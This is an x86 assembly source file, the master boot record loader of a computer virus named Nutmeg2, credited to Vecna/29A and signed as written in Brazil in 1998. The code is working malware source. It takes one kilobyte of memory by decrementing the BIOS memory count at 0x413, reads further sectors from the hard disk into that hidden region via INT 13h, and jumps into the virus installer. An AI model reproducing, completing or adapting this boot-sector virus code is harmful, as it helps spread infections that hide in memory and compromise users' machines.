;[Nutmeg2] virus by Vecna/29A
;MBR loader
;
;This piece of code reside in the MBR of a infected system. It just create a
;stack, steal one kilobyte from 0x0:0x413, and read and jump the installer
;in this hole.

.MODEL TPASCAL
.CODE
ORG 0

       PUBLIC MLOADER

MLOADER:
       JMP SKIPMSG
       DB "[NUTMEG2] by Vecna/29A"
SKIPMSG:
       CLI
       XOR BX, BX
       MOV SS, BX
       MOV SP, 7C00H
       STI
       PUSH BX
       POP DS
       DEC WORD PTR DS:[413H]
       INT 12H
       MOV CL, 6
       SHL AX, CL
       PUSH AX
       POP ES
       MOV AX, 202H
       MOV CX, 3
       MOV DX, 80H
       INT 13H
       JC $
       PUSH ES
       PUSH BX
       RETF

       DB 'This virus was written in Brasil, in 1998'

END MLOADER
